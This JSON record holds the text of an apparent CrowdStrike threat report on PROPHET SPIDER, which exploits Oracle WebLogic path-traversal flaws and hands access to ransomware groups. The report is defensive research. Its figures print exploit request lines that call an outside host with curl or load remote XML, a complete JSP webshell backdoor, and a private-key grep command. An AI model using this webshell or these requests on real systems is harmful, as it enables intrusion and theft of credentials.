{
    "id": "3f9ffa0e-bc42-432d-9544-0ecaefd739a7",
    "created_at": "2023-01-12T15:06:16.929184Z",
    "updated_at": "2025-03-27T02:14:05.263864Z",
    "deleted_at": null,
    "sha1_hash": "c7504368013945d2c874b29857a4c274719dddcd",
    "title": "2021-08-04 - PROPHET SPIDER Exploits Oracle WebLogic to Facilitate Ransomware Activity",
    "authors": "",
    "file_creation_date": "2022-05-28T23:14:17Z",
    "file_modification_date": "2022-05-28T23:14:17Z",
    "file_size": 436532,
    "plain_text": "# How PROPHET SPIDER Exploits Oracle WebLogic\n\n**[crowdstrike.com/blog/prophet-spider-exploits-oracle-weblogic-to-facilitate-ransomware-activity/](https://www.crowdstrike.com/blog/prophet-spider-exploits-oracle-weblogic-to-facilitate-ransomware-activity/)**\n\nFalcon OverWatch - CrowdStrike Intelligence - CrowdStrike IR August 4, 2021\n\nCrowdStrike Intelligence, Falcon OverWatch™ and CrowdStrike Incident Response\nteams have observed multiple campaigns by the eCrime actor PROPHET SPIDER\n[where the adversary has exploited Oracle WebLogic using CVE-2020-14882 and](https://nvd.nist.gov/vuln/detail/CVE-2020-14882) CVE2020-14750 directory traversal Remote Code Execution (RCE) vulnerabilities.\nPROPHET SPIDER is proficient in exploiting and operating in both Linux and Windows\nplatforms.\nIt is likely PROPHET SPIDER monetizes access to victim environments by handing off\naccess to third parties that will deploy ransomware.\n\n## Background\n\nPROPHET SPIDER is an eCrime actor that has been active since at least May 2017.\n\nPROPHET SPIDER primarily gains access to victims by compromising vulnerable web\nservers, and uses a variety of low-prevalence tools to achieve operational objectives,\nincluding the GOTROJ remote access trojan and a variety of reverse shell binaries.\n\n\n-----\n\nThis blog focuses on PROPHET SPIDER s recent trend of leveraging CVE-2020-14882 and\nCVE-2020-14750 to exploit unpatched Oracle WebLogic servers to gain initial access to\nvictim environments. The blog also discusses PROPHET SPIDER’s observed tactics on\nWindows and Linux systems, and their victim environment access handoff operations to\nmultiple adversary groups for ransomware deployment.\n\n## Oracle WebLogic Exploitation\n\nPROPHET SPIDER typically gains initial access via the exploitation of public-facing\napplications. In particular, CrowdStrike has observed PROPHET SPIDER exploit Oracle\nWebLogic vulnerabilities to gain access to victim environments. A commonly observed\navenue is the exploitation of two WebLogic CVEs: CVE-2020-14882 and CVE-2020-14750.\nBoth CVEs are related to path traversal vulnerabilities that allow an adversary access to the\nWebLogic administrative console, which consequently allows for unauthenticated remote\ncode execution, or RCE. (Note: Both vulnerabilities are essentially the same; the patch initially\nreleased to address CVE-2020-14882 in October 2020 was bypassed shortly after. The patch\nfor CVE-2020-14750 resolved the issue in a more comprehensive manner.)\n\nWhile the two WebLogic CVEs are the most commonly observed avenues of initial access,\nCrowdStrike has also observed PROPHET SPIDER exploit older Oracle CVEs, including\n[CVE-2016-0545, as well as perform SQL injection to gain access. CrowdStrike has not](https://nvd.nist.gov/vuln/detail/CVE-2016-0545)\nobserved PROPHET SPIDER gain initial access via other methods such as phishing, brute\nforcing, malvertising or drive-by downloads.\n\nCrowdStrike has observed PROPHET SPIDER conduct external reconnaissance scans to\ndetermine if a target is vulnerable to a WebLogic CVE using the website\n```\nburpcollaborator[.]net . This is a legitimate website that can be used in conjunction with\n\n```\nBurpSuite to send RCE command responses in blind injection-style attacks. For example, a\nCVE-2020-14882/CVE-2020-14750 request involving `burpcollaborator[.]net may look`\nlike the below, where an nslookup is performed on a subdomain of\n```\nburpcollaborator[.]net .\nGET /console/images/%252e%252e%252fconsole.portal?\n_nfpb=false&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&qu\n\n```\n**Figure 1. WebLogic access log showing the nslookup command executed on a**\n**subdomain of burpcollaborator[.]net**\n\nAnalysts looking for evidence of attempted exploitation of CVE-2020-14882 and/or CVE2020-14750 can examine WebLogic access logs for path traversal requests that reference the\nURI console.portal. The requests will involve encoding the characters “../” in some manner.\nThis may look like the examples below:\n```\nGET /console/images/%252E%252E%252Fconsole.portal\nGET /console/css/%252e%252e%252fconsole.portal\nGET /console/..%2Fconsole.portal\n\n```\n\n-----\n\n**Figure 2. WebLogic access log showing directory traversal requests that reference**\n**console.portal, indicative of attempted exploitation of CVE-2020-14882/14750**\n\nThere are multiple avenues to achieve RCE following the successful path traversal request. In\nsome cases, the GET request will contain additional parameters that include the RCE\ncommand. In the example below, the com.tangosol.coherence.mvel2.sh.ShellSession\nclass is invoked to execute a curl command.\n```\nGET /console/images/%252E%252E%252Fconsole.portal?\n_nfpb=false&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSe\n http://x.x.x.x:1234&quot;);&quot;);\n\n```\n**Figure 3. WebLogic access log showing the curl command executed via the**\n**tangosol.coherence.mvel2.sh.ShellSession class**\n\nAnother similar exploitation request PROPHET SPIDER has used leverages\n**ClassPathXmlApplicationContext or FileSystemXmlApplicaitonContext to achieve**\nexecution via a remotely hosted XML file. The remote URLs referenced in the below figure\nwould host an XML file that contains the command to execute.\n```\nGET /console/images/%252E%252E%252Fconsole.portal?\n_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.\nGET /console/images/%252E%252E%252Fconsole.portal?\nhandle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplication\n\n```\n**Figure 4. WebLogic access log showing ClassPathXmlApplicationContext or**\n**FileSystemXmlApplicaitonContext classes leveraged to execute commands via a**\n**remotely hosted XML file**\n\nIt is also possible to gain access without having the RCE command or XML file visible in the\nGET request. By examining backend logs on the WebLogic server and correlating them with\nthe access logs, analysts may see path traversal requests that line up with errors related to\n**com.tangosol.coherence.mvel2.sh.ShellSession. For example:**\n```\n2021-02-15 02:12:12 0.001 1164 GET /console/..%2Fconsole.portal?\n_nfpb=true&amp;_pageLabel=UnexpectedExceptionPage\n####<Feb 15, 2021, 02:12:13,361 AM EST> < …> Administration Console encountered the\nfollowing error: Unexpected exception occured in page flow request\nprocessor:weblogic.security.service.InvalidParameterException: Unable to instanciate\nhandle type: com.tangosol.coherence.mvel2.sh.ShellSession\n\n```\n**Figure 5. WebLogic access log showing directory traversal activity that correlates to a**\n**WebLogic console log error for com.tangosol.coherence.mvel2.sh.ShellSession**\n\nAnalysts may also observe failed RCE on Linux systems that attempt to execute a Windowsbased command, and vice versa — an indication of the widespread targeting of this exploit’s\nvulnerability.\n\n\n-----\n\n## Linux Tactics\n\nSince PROPHET SPIDER gains access via web servers or other public-facing servers, they\nwill often initially compromise a Linux-based system. Once initial access is obtained on a\nLinux system, PROPHET SPIDER typically deploys a webshell, reverse shell binary or a perl\nreverse shell script (commonly named `bc.pl ) as their initial persistence mechanism.`\n\nPROPHET SPIDER demonstrates a good understanding of the Linux command shell and\nuses a wide range of commands to enumerate system process, account and networking\ninformation.\n\n### Persistence\n\nFigure 6 below contains a sample JSP webshell leveraged by PROPHET SPIDER on an\nOracle WebLogic server used as a persistence mechanism that allowed for access and\nremote commands to be issued on the system.\n\n\n-----\n\n```\n<\n% !String middleware = \"517c7dcfd19771f1\";\nString pass = \"3626708ee86f82d0493e684e1f400787\";\nString md5 = md5(pass + middleware);\nclass X extends ClassLoader {\n  public X(ClassLoader z) {\n    super(z);\n  }\n  public Class Q(byte[] cb) {\n    return super.defineClass(cb, 0, cb.length);\n  }\n}\npublic byte[] x(byte[] s, boolean m) {\n  try {\n    javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n    c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(middleware.getBytes(),\n\"AES\"));\n    return c.doFinal(s);\n  } catch (Exception e) {\n    return null;\n  }\n}\npublic static String md5(String s) {\n  String ret = null;\n  try {\n    java.security.MessageDigest m;\n    m = java.security.MessageDigest.getInstance(\"MD5\");\n    m.update(s.getBytes(), 0, s.length());\n    ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n  } catch (Exception e) {}\n  return ret;\n}\npublic static String base64Encode(byte[] bs) throws Exception {\n  Class base64;\n  String value = null;\n  try {\n    base64 = Class.forName(\"java.util.Base64\");\n    Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);\n    value = (String) Encoder.getClass().getMethod(\"encodeToString\", new Class[] {\n      byte[].class\n    }).invoke(Encoder, new Object[] {\n      bs\n    });\n  } catch (Exception e) {\n    try {\n      base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n      Object Encoder = base64.newInstance();\n      value = (String) Encoder.getClass().getMethod(\"encode\", new Class[] {\n        byte[].class\n      }).invoke(Encoder, new Object[] {\n        bs\n      });\n      value = value.replace(\"\\n\", \"\").replace(\"\\r\", \"\");\n    } catch (Exception e2) {}\n  }\n  return value;\n\n```\n\n-----\n\n```\n}\npublic static byte[] base64Decode(String bs) throws Exception {\n  Class base64;\n  byte[] value = null;\n  try {\n    base64 = Class.forName(\"java.util.Base64\");\n    Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);\n    value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[] {\n      String.class\n    }).invoke(decoder, new Object[] {\n      bs\n    });\n  } catch (Exception e) {\n    try {\n      base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n      Object decoder = base64.newInstance();\n      value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]\n{\n        String.class\n      }).invoke(decoder, new Object[] {\n        bs\n      });\n    } catch (Exception e2) {}\n  }\n  return value;\n} % >\n<\n%\ntry {\n  byte[] data = base64Decode(request.getParameter(pass));\n  data = x(data, false);\n  if (session.getAttribute(\"payload\") == null) {\n    session.setAttribute(\"payload\", new\nX(pageContext.getClass().getClassLoader()).Q(data));\n  } else {\n    request.setAttribute(\"parameters\", new String(data));\n    Object f = ((Class) session.getAttribute(\"payload\")).newInstance();\n    f.equals(pageContext);\n    response.getWriter().write(md5.substring(0, 16));\n    response.getWriter().write(base64Encode(x(base64Decode(f.toString()), true)));\n    response.getWriter().write(md5.substring(16));\n  }\n} catch (Exception e) {} % >\n\n```\n**Figure 6. A sample JSP webshell leveraged by PROPHET SPIDER on an Oracle**\n**WebLogic server for persistence**\n\n### Credential Access\n\nOn Linux-based systems, PROPHET SPIDER attempts to harvest information relating to SSH\nkeys, and RSA keys generally, using cat to list the contents of `id_rsa,` `id_dsa, or`\n. ssh/authorized_keys . In one case, PROPHET SPIDER used `grep to search for private`\n\n\n-----\n\nkeys stored in files across various directories, including `root,` `home,` `etc, and` `mnt, for`\nexample: `timeout 40 grep -rl \\-\\-\\-\\-\\-BEGIN .* PRIVATE KEY.*\\-\\-\\-\\-\\-`\n```\n/home .\n\n### Lateral Movement\n\n```\n[To enable lateral movement, the adversary uses ping and nslookup commands, in addition to](https://www.crowdstrike.com/cybersecurity-101/lateral-movement/)\nscanning the environment for Windows systems listening on port 445. This is done using a\nsimple port scanning binary unique to PROPHET SPIDER, typically named pscan or pscan2.\nFor example, process logging may reveal similar commands to the below. Note the\ncommands are executed by the oracle user account, which is the user that runs WebLogic. In\nmultiple PROPHET SPIDER cases, CrowdStrike observed a reverse shell binary located at\n**/var/tmp/[filename], which launches bash as a child; and the pscan2 command is a child to**\nbash. The reverse shell is a child to PID 1, which indicates it was either executed via an init\nscript created for persistence, or its parent was terminated causing it to become a zombie\nprocess that was reaped by the init daemon.\n\n**USER** **PID** **PPID** **COMMAND**\n\noracle 4210 1 /var/tmp/[filename]\n\noracle 4211 4210 bash\n\noracle 5732 4211 ./pscan2 10.10.20.0 10.10.20.255 445 <output file>\n\n**Figure 7. Example process listing showing PROPHET SPIDER invoked processes**\n**running on a Linux system under the oracle account**\n\n### Anti-forensics Activity\n\nPROPHET SPIDER commonly deletes their tools after use using `rm, clears the bash`\nHISTFILE environment variable and has used a custom ELF binary for clearing logs on Linux\ndevices. PROPHET SPIDER typically compresses SSH key information into 7-Zip or TAR\narchives. In contrast to many other actors using existing Remote Access Tool (RAT) C2\nchannels for exfiltration, PROPHET SPIDER uses File Transfer Protocol (FTP) or PSCP to\nexfiltrate archived key information.\n\n### Linux to Windows Transition\n\nIn some cases, PROPHET SPIDER initially compromises a Windows-based system.\nHowever, CrowdStrike has typically observed PROPHET SPIDER initially compromise a\nLinux system and then move into a victim’s Windows-based environment using compromised\ncredentials via Telnet, SSH or SMB.\n\n\n-----\n\nIn multiple cases, CrowdStrike observed PROPHET SPIDER leveraged a SOCKS proxy tool\n(typically named auditd) that allowed for lateral movement into the victim’s Windows\nenvironment without having to execute additional programs on the compromised Linux\nsystem. In some cases, PROPHET SPIDER deployed the WinExe tool, which allows a Linux\nsystem to execute commands remotely on a Windows system. CrowdStrike has observed\nmultiple incidents where the WinExe binary was named wmhost.exe, and the service it\ncreated on remote systems to achieve execution was named wmhost. CrowdStrike has also\n[observed PROPHET SPIDER execute a ZeroLogon (CVE-2020-1472) exploit binary from](https://nvd.nist.gov/vuln/detail/cve-2020-1472)\nLinux targeting the victim’s Windows environment.\n\nAnalysts should watch for a large number of failed logins, or anonymous logons, originating\nfrom the Linux system targeting Windows systems. Special attention should be paid to any\nlegacy systems such as Windows Server 2003 that may exist in the environment, as these\ncan be easier targets for initial lateral movement.\n\n## Windows Tactics\n\nPROPHET SPIDER typically uses PowerShell to download Wget, typically downloading Wget\nto `C:\\Windows\\Temp\\7fde\\wget.bin as the first post-compromise action on a Windows`\nserver running Oracle WebLogic. The adversary then uses Wget to download additional\nutilities such as `7zip to` `C:\\Windows\\Temp\\7fde\\7z.bin and additional malware, such as`\nthe GOTROJ backdoor, reverse shell binaries, or a SOCKS proxy tool. CrowdStrike has\nobserved PROPHET SPIDER consistently use the directory `C:\\Windows\\Temp\\7fde\\ to`\nstore tools. The adversary commonly creates Windows services, e.g. `WindowsNTApp for`\nGOTROJ, to establish persistence for downloaded malware.\n\n\n-----\n\n(Click to enlarge)\n\n**Figure 8. Process tree resulting from PROPHET SPIDER targeting a Windows-based**\n**WebLogic server, highlighting their use of** `wget.bin and` `7z.bin .`\n\nIn one case after initial access and persistence was gained through the use of a common JSP\nwebshell, PROPHET SPIDER deployed a JSP SOCKS proxy known as reGeorg to the\nexternal facing compromised Oracle WebLogic system. The adversary leveraged the proxy\nand the renamed WinExe binary to move laterally to other systems in the network and\nperform initial network and active directory reconnaissance. Analysts should look for source\nnetwork workstation name mismatches in Windows authentications logs, as it was discovered\nthe adversary’s workstation name was captured likely due to the use of the proxy.\n\n### Credential Access\n\nOn Windows, PROPHET SPIDER uses vssadmin.exe to obtain Security Account Manager\n(SAM) and system credential stores. The adversary has also deployed Mimikatz binaries to\ndump credentials stored in system memory. PROPHET SPIDER consistently attempts to\nobtain NTDS.DIT, the active directory database, typically using vssadmin.exe for this purpose.\nTo support credential dumping, PROPHET SPIDER uses\n```\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\"\n\n```\nto identify where `NTDS.DIT is located.`\n\n\n-----\n\n### Data Staging and Exfiltration\n\nAfter gaining access to victim domain controllers, the adversary rapidly introduces additional\ntooling (7zip, PSCP/FTP), harvests credential stores, compresses files and then exfiltrates\nthem to a remote IP address using PSCP or FTP.\n\n## Access Broker and Handoff Tradecraft Observations\n\nIn at least two separate cases, PROPHET SPIDER infections have resulted in ransomware\ndeployment, likely from separate adversary groups.\n\nIn a 2020 campaign, PROPHET SPIDER did not immediately operationalize a breach of an\nApache web server. Several months later, an unattributed adversary leveraged this access,\nconducting internal reconnaissance followed by Cobalt Strike deployment, AD enumeration\nusing AdFind and exfiltration using WinSCP. This activity was followed by deployment of\n_Egregor ransomware across the environment, and victim data was later posted to the Egregor_\ndedicated leak site.\n\nIn a 2021 campaign, two weeks after PROPHET SPIDER ceased interactive operations, an\nunattributed actor downloaded a Cobalt Strike stager DLL from a remote IP address. When\nrun with the argument `11985756, the DLL downloaded a Cobalt Strike payload. The`\nadversary used ADFind to enumerate Active Directory, then moved laterally, using a\ncompromised administrative account, and downloading additional Cobalt Strike Beacon\npayloads onto some systems, or using PSExec to run Cobalt Strike. The adversary further\n[used PowerSploit to enumerate the victim environment. Before deploying ransomware, the](https://www.crowdstrike.com/cybersecurity-101/ransomware/)\nadversary staged data in ZIP archives and likely exfiltrated these archives. Batch scripts\nsubsequently deployed MountLocker across the victim environment.\n\nWhile there are multiple potential hypotheses for this activity, including PROPHET SPIDER\noperators deploying ransomware, CrowdStrike Intelligence assesses that the most likely\nexplanation is that PROPHET SPIDER functioned as an access broker. PROPHET SPIDER\nlikely granted access to Egregor and MountLocker operators respectively in exchange for\npayment.\n\nThis assessment carries low confidence (see the end of this blog for an explanation of\nconfidence rating), reflecting several factors:\n\nNo other Egregor or MountLocker cases involved PROPHET SPIDER TTPs or artifacts\nPROPHET SPIDER’s TTPs differ significantly from TTPs commonly observed in\n_Egregor and MountLocker campaigns; for instance, PROPHET SPIDER does not_\nnormally use Cobalt Strike\nMany ransomware operators are known to purchase access to victims via access\nbrokers\n\n## Recommendations\n\n\n-----\n\nThe best defense against opportunistic attacks by access brokers such as PROPHET\nSPIDER is to ensure your externally facing servers are fully patched. However, preventative\nmeasures are not a silver bullet. Adversaries may be able to bypass even robust and secure\n[perimeters using a variety of techniques. Therefore, proactive threat hunting such as what](https://www.crowdstrike.com/cybersecurity-101/threat-hunting/)\n[Falcon OverWatch provides is also essential. When threat hunters are effectively scouring](https://www.crowdstrike.com/endpoint-security-products/falcon-overwatch-threat-hunting/)\nyour network for even the most subtle clues of a potential adversary presence, they can\nquickly home in on unusual behaviors like the living-off-the-land discovery actions that\nPROPHET SPIDER commonly leverages when they initially gain access. In addition to\nhunting for unexpected reconnaissance, defenders should also monitor their environment for\npotentially malicious ingress tool transfer. To do so, continually monitor for unexpected\nprocesses retrieving files from external servers as well as uncommon network data flows.\nLastly, defenders should hunt for malicious and/or anomalous use of legitimate tools, as\nlegacy antivirus products typically will not block these tools because of their common and\nlegitimate usage.\n\n## Indicators of Compromise\n\n**Description** **Hashes**\n\n\nGOTROJ\nSHA256\nhashes\n\nJSP\nWebshell\nSHA256\nhashes\n\n```\n57150938be45c4d9c742ab24c693acc14cc071d23b088a1facc2a7512af89414\n\n```\n```\n9d42c2b6a10866842cbb6ab455ee2c3108e79fecbffb72eaf13f05215a826765\n\n```\n\n## MITRE ATT&CK® Observed Tactics\n\n**Tactic** **Description**\n\nReconnaissance T1590: [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590/)\nT1595.002: [Active Scanning: Vulnerability Scanning](https://attack.mitre.org/techniques/T1595/002/)\n\nInitial Access T1190: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)\n\nPersistence T1505.003: [Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)\n\nCredential Access T1003.003: [OS Credential Dumping: NTDS](https://attack.mitre.org/techniques/T1003/003/)\n\n\n-----\n\nLateral Movement T1021: [Remote Services](https://attack.mitre.org/techniques/T1021/)\n\nDefense Evasion T1070.003: [Indicator Removal on Host: Clear Command History](https://attack.mitre.org/techniques/T1070/003/)\n\n## Explanation of Confidence Rating\n\n**High Confidence: Judgments are based on high-quality information from multiple sources.**\nHigh confidence in the quality and quantity of source information supporting a judgment does\nnot imply that that assessment is an absolute certainty or fact. The judgment still has a\nmarginal probability of being inaccurate.\n\n**Moderate Confidence: Judgments are based on information that is credibly sourced and**\nplausible, but not of sufficient quantity or corroborated sufficiently to warrant a higher level of\nconfidence. This level of confidence is used to express that judgments carry an increased\nprobability of being incorrect until more information is available or corroborated.\n\n**Low Confidence: Judgments are made where the credibility of the source is uncertain, the**\ninformation is too fragmented or poorly corroborated enough to make solid analytic\ninferences, or the reliability of the source is untested. Further information is needed for\ncorroboration of the information or to fill known intelligence gaps.\n\n**Additional Resources**\n\n_To learn more about how to incorporate intelligence on threat actors into your security_\n_strategy, visit the_ _[Falcon X™ Premium Threat Intelligence page.](https://www.crowdstrike.com/endpoint-security-products/falcon-x-threat-intelligence/premium/)_\n_[Visit the CrowdStrike website to learn more about CrowdStrike Services and](https://www.crowdstrike.com/services/)_ _Falcon_\n_OverWatch offerings._\n_[Learn more on how Falcon Spotlight™ can help you discover and manage](https://store.crowdstrike.com/en-US/apps/352/falcon-spotlight#overview)_\n_vulnerabilities in your environments._\n_[Get a full-featured free trial of CrowdStrike Falcon Prevent™ and learn how true next-](https://go.crowdstrike.com/try-falcon-prevent.html)_\n_gen AV performs against today’s most sophisticated threats._\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-04 - PROPHET SPIDER Exploits Oracle WebLogic to Facilitate Ransomware Activity.pdf"
    ],
    "report_names": [
        "2021-08-04 - PROPHET SPIDER Exploits Oracle WebLogic to Facilitate Ransomware Activity.pdf"
    ],
    "threat_actors": [
        {
            "id": "056826cb-6e17-4954-a9b4-2cc8c6ae3cb8",
            "created_at": "2023-03-04T02:01:54.115678Z",
            "updated_at": "2025-03-27T02:00:03.125249Z",
            "deleted_at": null,
            "main_name": "Prophet Spider",
            "aliases": [
                "GOLD MELODY",
                "UNC961"
            ],
            "source_name": "MISPGALAXY:Prophet Spider",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "47b52642-e5b8-4502-b714-b625002d86aa",
            "created_at": "2024-06-19T02:03:08.086579Z",
            "updated_at": "2025-03-27T02:05:17.385492Z",
            "deleted_at": null,
            "main_name": "GOLD MELODY",
            "aliases": [
                "UNC961",
                "PROPHET SPIDER"
            ],
            "source_name": "Secureworks:GOLD MELODY",
            "tools": [
                " 7-ZIP",
                " AUDITUNNEL",
                " BURP Suite",
                " GOTROJ",
                " JSP webshells",
                " Mimikatz",
                " Wget",
                "7-ZIP"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535976,
    "ts_updated_at": 1743041645,
    "ts_creation_date": 1653779657,
    "ts_modification_date": 1653779657,
    "files": {
        "pdf": "https://archive.orkl.eu/c7504368013945d2c874b29857a4c274719dddcd.pdf",
        "text": "https://archive.orkl.eu/c7504368013945d2c874b29857a4c274719dddcd.txt",
        "img": "https://archive.orkl.eu/c7504368013945d2c874b29857a4c274719dddcd.jpg"
    }
}